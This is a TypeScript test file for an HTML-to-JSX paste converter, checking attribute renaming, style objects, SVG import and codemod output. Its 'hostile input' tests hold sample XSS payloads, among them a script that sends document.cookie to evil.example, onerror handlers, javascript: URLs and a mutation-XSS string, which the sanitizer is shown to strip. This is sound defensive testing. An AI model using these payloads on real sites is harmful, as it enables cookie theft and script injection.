/**
 * htmlToJsx - pasted HTML becomes the intrinsic-JSX tree an `insert` writes.
 *
 * The first block is the conversion table (attributes, style strings, void
 * elements, entities, whitespace, SVG). The second is hostile input: the
 * markup is sanitized before it is read, the converter re-checks what it reads,
 * and every removal is COUNTED - a paste never drops something without saying.
 *
 * The last block hands the converted tree to the REAL codemod
 * (`insertJsxElement`), because a plausible-looking object is worth nothing: the
 * question is whether what lands in the user's `.tsx` is valid JSX.
 *
 * The fixtures share nothing with the eSIM corpus: a bakery's order form and a
 * trail-running club's page.
 */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { insertJsxElement } from '@core/ast-codemods'
import { MAX_PASTED_ELEMENTS } from '@core/utils/pastedHtmlLimits'
import { htmlToJsx, pinPastedRoots } from '@site/studio/htmlToJsx'
import type { SlotJsxNode } from '@site/studio/studioSaveRequests'

function convert(html: string) {
  const result = htmlToJsx(html)
  if (!result.ok) throw new Error(`expected a conversion, got: ${result.message}`)
  return result
}

const only = (html: string): SlotJsxNode => {
  const { nodes } = convert(html)
  expect(nodes).toHaveLength(1)
  return nodes[0]!
}

const kids = (node: SlotJsxNode): SlotJsxNode[] => (Array.isArray(node.children) ? node.children : [])

describe('htmlToJsx - attributes', () => {
  it('renames class and for, and keeps data-* / aria-* as written', () => {
    const node = only('<label class="field  big" for="flour" data-test-id="x" aria-label="Flour">Flour</label>')
    expect(node).toEqual({
      name: 'label',
      props: { className: 'field big', htmlFor: 'flour', 'data-test-id': 'x', 'aria-label': 'Flour' },
      children: 'Flour',
    })
  })

  it('camelCases the HTML attributes React spells in camelCase', () => {
    const node = only('<input maxlength="8" readonly tabindex="2" autocomplete="off" type="text">')
    expect(node.props).toEqual({ maxLength: '8', readOnly: true, tabIndex: '2', autoComplete: 'off', type: 'text' })
    const cell = only('<table><tbody><tr><td colspan="2" rowspan="3">x</td></tr></tbody></table>')
    const td = kids(kids(kids(cell)[0]!)[0]!)[0]!
    expect(td.props).toEqual({ colSpan: '2', rowSpan: '3' })
  })

  it('writes a boolean attribute as a bare prop', () => {
    expect(only('<button disabled type="submit">Order</button>').props).toEqual({ disabled: true, type: 'submit' })
    expect(only('<video controls muted loop></video>').props).toEqual({ controls: true, muted: true, loop: true })
  })

  it('turns form state into its uncontrolled spelling', () => {
    expect(only('<input type="text" value="Rye" name="loaf">').props).toEqual({ type: 'text', defaultValue: 'Rye', name: 'loaf' })
    expect(only('<input type="checkbox" checked value="gluten">').props).toEqual({
      type: 'checkbox',
      defaultChecked: true,
      value: 'gluten',
    })
    expect(only('<input type="submit" value="Send order">').props).toEqual({ type: 'submit', value: 'Send order' })
    const select = only('<select name="size"><option value="s">Small</option><option value="l" selected>Large</option></select>')
    expect(select.props).toEqual({ name: 'size', defaultValue: 'l' })
    expect(kids(select).map((option) => option.props)).toEqual([{ value: 's' }, { value: 'l' }])
    expect(only('<textarea name="note">\nNo nuts</textarea>')).toEqual({
      name: 'textarea',
      props: { name: 'note', defaultValue: 'No nuts' },
    })
  })

  it('never writes React-only props or a namespace declaration', () => {
    const node = only('<div key="a" ref="b" children="c" xmlns="http://www.w3.org/1999/xhtml" id="x"></div>')
    expect(node.props).toEqual({ id: 'x' })
  })
})

describe('htmlToJsx - style strings', () => {
  it('turns style="..." into an object with React keys', () => {
    const node = only('<div style="background-color: #fde68a; padding:8px 12px; --accent: tomato; -webkit-line-clamp: 2; float:left">x</div>')
    expect(node.props).toEqual({
      style: {
        backgroundColor: '#fde68a',
        padding: '8px 12px',
        '--accent': 'tomato',
        WebkitLineClamp: '2',
        float: 'left',
      },
    })
  })

  it('drops !important (a string "red !important" is not a value React sets) and keeps the value', () => {
    expect(only('<p style="color: red !important">x</p>').props).toEqual({ style: { color: 'red' } })
  })

  it('counts a declaration that loads an external resource or that the CSS sanitizer refuses, and keeps the rest', () => {
    const result = convert(
      '<div style="color: red; background: url(https://tracker.example/p.gif); width: expression(alert(1))">x</div>',
    )
    expect(result.nodes[0]!.props).toEqual({ style: { color: 'red' } })
    expect(result.report.styleDeclarations).toBe(2)
  })

  it('writes no style prop when every declaration was dropped', () => {
    const result = convert('<div style="background: url(https://tracker.example/p.gif)">x</div>')
    expect(result.nodes[0]!.props).toBeUndefined()
  })
})

describe('htmlToJsx - elements and text', () => {
  it('writes void elements without children so they render self-closed', () => {
    const list = only('<div>one<br>two<img src="/loaf.png" alt="Loaf"><hr></div>')
    expect(kids(list).map((child) => child.name)).toEqual(['span', 'br', 'span', 'img', 'hr'])
    expect(kids(list).find((child) => child.name === 'img')).toEqual({ name: 'img', props: { src: '/loaf.png', alt: 'Loaf' } })
    expect(kids(list).find((child) => child.name === 'br')!.children).toBeUndefined()
  })

  it('reads entities as the characters they mean', () => {
    const node = only('<p>Rye &amp; spelt &lt;fresh&gt; &quot;daily&quot; &#169; 2026</p>')
    expect(node.children).toBe('Rye & spelt <fresh> "daily" © 2026')
    expect(only('<a href="/menu?a=1&amp;b=2" title="Tom &amp; Jerry">x</a>').props).toEqual({
      href: '/menu?a=1&b=2',
      title: 'Tom & Jerry',
    })
  })

  it('collapses whitespace the way HTML does and drops the indentation between blocks', () => {
    const list = only(`
      <ul>
        <li>   Sourdough
           loaf   </li>
        <li>Rye</li>
      </ul>
    `)
    expect(list).toEqual({
      name: 'ul',
      children: [
        { name: 'li', children: 'Sourdough loaf' },
        { name: 'li', children: 'Rye' },
      ],
    })
  })

  it('wraps a text run that sits beside elements in a span, keeping the space between inline neighbours', () => {
    const para = only('<p>Fresh <b>every</b> morning, <i>baked</i> <i>slow</i></p>')
    expect(kids(para)).toEqual([
      { name: 'span', children: 'Fresh ' },
      { name: 'b', children: 'every' },
      { name: 'span', children: ' morning, ' },
      { name: 'i', children: 'baked' },
      { name: 'span', children: ' ' },
      { name: 'i', children: 'slow' },
    ])
  })

  it('wraps bare top-level text in a span and writes several roots', () => {
    const { nodes } = convert('Hello <em>there</em><p>Second</p>')
    expect(nodes.map((node) => node.name)).toEqual(['span', 'em', 'p'])
  })

  it('keeps the lines of a preformatted block as one span per line', () => {
    const pre = only('<pre>const a = 1\n  const b = 2</pre>')
    expect(pre).toEqual({
      name: 'pre',
      children: [
        { name: 'span', children: 'const a = 1' },
        { name: 'br' },
        { name: 'span', children: '  const b = 2' },
      ],
    })
  })

  it('writes an element with no content as an empty element', () => {
    expect(only('<div class="spacer"></div>')).toEqual({ name: 'div', props: { className: 'spacer' } })
  })

  it('lets an element a project cannot write keep its content', () => {
    const node = only('<div><my-widget><b>kept</b></my-widget></div>')
    expect(node).toEqual({ name: 'div', children: [{ name: 'b', children: 'kept' }] })
  })

  it('reads tables as the parser repairs them (tbody) with no stray whitespace nodes', () => {
    const table = only('<table> <tr> <td>a</td> <td>b</td> </tr> </table>')
    expect(table).toEqual({
      name: 'table',
      children: [{ name: 'tbody', children: [{ name: 'tr', children: [{ name: 'td', children: 'a' }, { name: 'td', children: 'b' }] }] }],
    })
  })

  it('collects the <style> text and leaves the elements alone', () => {
    const result = convert('<style>.card { padding: 8px }</style><div class="card">x</div><style>.b{color:red}</style>')
    expect(result.css).toBe('.card { padding: 8px }\n.b{color:red}')
    expect(result.nodes).toEqual([{ name: 'div', props: { className: 'card' }, children: 'x' }])
  })

  it('refuses markup with no elements, with a sentence', () => {
    expect(htmlToJsx('   ')).toEqual({ ok: false, message: 'There is no HTML to paste.' })
    const styleOnly = htmlToJsx('<style>.a{color:red}</style>')
    expect(styleOnly.ok).toBe(false)
    expect(styleOnly.ok === false && styleOnly.message).toContain('only a stylesheet')
  })

  it('refuses a paste past the element budget instead of truncating it', () => {
    const result = htmlToJsx(`<ul>${'<li>x</li>'.repeat(MAX_PASTED_ELEMENTS + 5)}</ul>`)
    expect(result.ok).toBe(false)
    expect(result.ok === false && result.message).toContain('too large')
  })
})

describe('htmlToJsx - SVG', () => {
  it('converts an <svg> through the SVG importer: attribute names, ids and style strings', () => {
    const { nodes } = convert(
      '<button><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon"><path stroke-width="2" fill-rule="evenodd" d="M1 1h4" style="fill:#fff"/></svg> Save</button>',
    )
    const button = nodes[0]!
    const [svg, label] = kids(button)
    expect(svg!.name).toBe('svg')
    expect(svg!.props).toMatchObject({ viewBox: '0 0 24 24', className: 'icon' })
    expect(kids(svg!)[0]).toEqual({
      name: 'path',
      props: { strokeWidth: '2', fillRule: 'evenodd', d: 'M1 1h4', fill: '#fff' },
    })
    expect(label).toEqual({ name: 'span', children: ' Save' })
  })

  it('says why an <svg> was not written and still pastes the rest', () => {
    const deep = `${'<g>'.repeat(14)}<path d="M0 0h8"/>${'</g>'.repeat(14)}`
    const result = convert(`<p>Logo</p><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8">${deep}</svg>`)
    expect(result.nodes.map((node) => node.name)).toEqual(['p'])
    expect(result.report.svgRefusals).toHaveLength(1)
    expect(result.report.svgRefusals[0]).toContain('too deep')
  })

  it('cannot be fooled by markup that looks like the converter placeholder', () => {
    const { nodes } = convert('<span data-studio-svg="abc:0">decoy</span>')
    expect(nodes).toEqual([{ name: 'span', children: 'decoy' }])
  })
})

describe('htmlToJsx - hostile input', () => {
  it('removes <script> and counts it', () => {
    const result = convert('<div>ok<script>fetch("https://evil.example/?c="+document.cookie)</script></div>')
    expect(JSON.stringify(result.nodes)).not.toContain('evil')
    expect(JSON.stringify(result.nodes)).not.toContain('script')
    expect(result.nodes[0]).toEqual({ name: 'div', children: 'ok' })
    expect(result.report.scripts).toBe(1)
  })

  it('removes event handlers (onerror, onclick) and counts them', () => {
    const result = convert('<img src="x" alt="a" onerror="alert(1)"><button onclick="steal()" ONMOUSEOVER="x()">Go</button>')
    const text = JSON.stringify(result.nodes)
    expect(text).not.toMatch(/onerror|onclick|onmouseover|alert|steal/i)
    expect(result.nodes.map((node) => node.name)).toEqual(['img', 'button'])
    expect(result.report.handlers).toBe(3)
  })

  it('removes javascript: / vbscript: URLs but keeps ordinary links', () => {
    const result = convert(
      '<a href="javascript:alert(1)">a</a><a href="  JaVaScRiPt:alert(2)">b</a><a href="vbscript:x">c</a><a href="/menu">d</a><a href="https://example.org/x?y=1">e</a><a href="mailto:hi@example.org">f</a>',
    )
    expect(result.nodes.map((node) => node.props)).toEqual([
      undefined,
      undefined,
      undefined,
      { href: '/menu' },
      { href: 'https://example.org/x?y=1' },
      { href: 'mailto:hi@example.org' },
    ])
    expect(JSON.stringify(result.nodes)).not.toMatch(/javascript|vbscript/i)
    expect(result.report.unsafeUrls).toBe(3)
  })

  it('keeps an inline raster image in src but refuses any other data: URL', () => {
    const result = convert(
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"><a href="data:text/html;base64,PHNjcmlwdD4=">x</a><iframe src="https://evil.example"></iframe>',
    )
    expect(result.nodes[0]!.props).toEqual({ src: 'data:image/png;base64,iVBORw0KGgo=', alt: 'dot' })
    expect(JSON.stringify(result.nodes)).not.toContain('text/html')
    expect(JSON.stringify(result.nodes)).not.toContain('iframe')
  })

  it('drops iframes, objects and embeds, and srcdoc never survives', () => {
    const result = convert('<object data="x.swf"></object><embed src="y"><iframe srcdoc="<script>1</script>"></iframe><p>text</p>')
    expect(result.nodes.map((node) => node.name)).toEqual(['p'])
  })

  it('does not force target=_blank on links the way the richtext profile does', () => {
    expect(only('<a href="/x">x</a>').props).toEqual({ href: '/x' })
  })

  it('survives a mutation-XSS style payload without writing the active part', () => {
    const result = htmlToJsx('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>')
    expect(JSON.stringify(result.ok ? result.nodes : [])).not.toMatch(/onerror|alert/)
  })
})

describe('htmlToJsx - what the codemod writes', () => {
  let dir: string
  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'html-to-jsx-'))
  })
  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true })
  })

  const PAGE = `export default function Page() {
  return (
    <main>
      <h1>Order</h1>
    </main>
  )
}
`

  it('writes the converted tree as valid, readable JSX', () => {
    const { nodes } = convert(
      '<form class="order" action="/order" method="post"><label for="loaf">Loaf</label><input id="loaf" name="loaf" value="Rye" maxlength="12" required><button type="submit" style="background-color: #1c1917; color: white">Send &amp; pay</button></form>',
    )
    const file = path.join(dir, 'Page.tsx')
    fs.writeFileSync(file, PAGE, 'utf8')
    const [first, ...rest] = nodes
    const result = insertJsxElement({
      file,
      line: 3,
      col: 6,
      name: first!.name,
      props: first!.props,
      children: first!.children,
      siblings: rest,
    })
    expect(result.ok).toBe(true)
    expect(fs.readFileSync(file, 'utf8')).toBe(`export default function Page() {
  return (
    <main>
      <h1>Order</h1>
      <form className="order" action="/order" method="post">
        <label htmlFor="loaf">Loaf</label>
        <input id="loaf" name="loaf" defaultValue="Rye" maxLength="12" required />
        <button type="submit" style={{ backgroundColor: "#1c1917", color: "white" }}>Send &amp; pay</button>
      </form>
    </main>
  )
}
`)
  })
})

describe('htmlToJsx - relative URLs copied from the editor page stay relative (r3)', () => {
  const editor = { origin: 'http://127.0.0.1:6131', pathname: '/admin/site' }
  const props = (html: string) => {
    const result = htmlToJsx(html, editor)
    if (!result.ok) throw new Error(result.message)
    return result.nodes[0]!.props
  }

  it('strips the editor origin and the editor page directory back off an absolutized src', () => {
    expect(props('<img src="http://127.0.0.1:6131/admin/loaf.png" alt="">')).toMatchObject({ src: 'loaf.png' })
    expect(props('<img src="http://127.0.0.1:6131/admin/img/loaf.png?v=2" alt="">')).toMatchObject({ src: 'img/loaf.png?v=2' })
  })

  it('keeps a root-relative path root-relative, and never writes the editor origin', () => {
    expect(props('<img src="http://127.0.0.1:6131/assets/loaf.png" alt="">')).toMatchObject({ src: '/assets/loaf.png' })
    expect(props('<a href="http://127.0.0.1:6131/menu">Menu</a>')).toMatchObject({ href: '/menu' })
  })

  it('restores each srcset candidate and leaves other origins alone', () => {
    expect(props('<img srcset="http://127.0.0.1:6131/admin/a.png 1x, http://127.0.0.1:6131/admin/b.png 2x" alt="">')).toMatchObject({
      srcSet: 'a.png 1x, b.png 2x',
    })
    expect(props('<img src="https://cdn.example.com/a.png" alt="">')).toMatchObject({ src: 'https://cdn.example.com/a.png' })
    expect(props('<img src="http://127.0.0.1:61310/admin/a.png" alt="">')).toMatchObject({ src: 'http://127.0.0.1:61310/admin/a.png' })
  })
})

describe('pinPastedRoots - a paste into a free frame is pinned, not left at 0,0 (r3)', () => {
  const placement = { property: 'left' as const, inline: 40, top: 120 }

  it('writes position and insets on each root, cascading one step per root, and keeps the root\'s own style', () => {
    const { nodes } = convert('<section style="color: red">One</section><section>Two</section>')
    const pinned = pinPastedRoots(nodes, placement)
    expect(pinned[0]!.props!.style).toEqual({ color: 'red', position: 'absolute', left: '40px', top: '120px' })
    expect(pinned[1]!.props!.style).toEqual({ position: 'absolute', left: '64px', top: '144px' })
  })
})
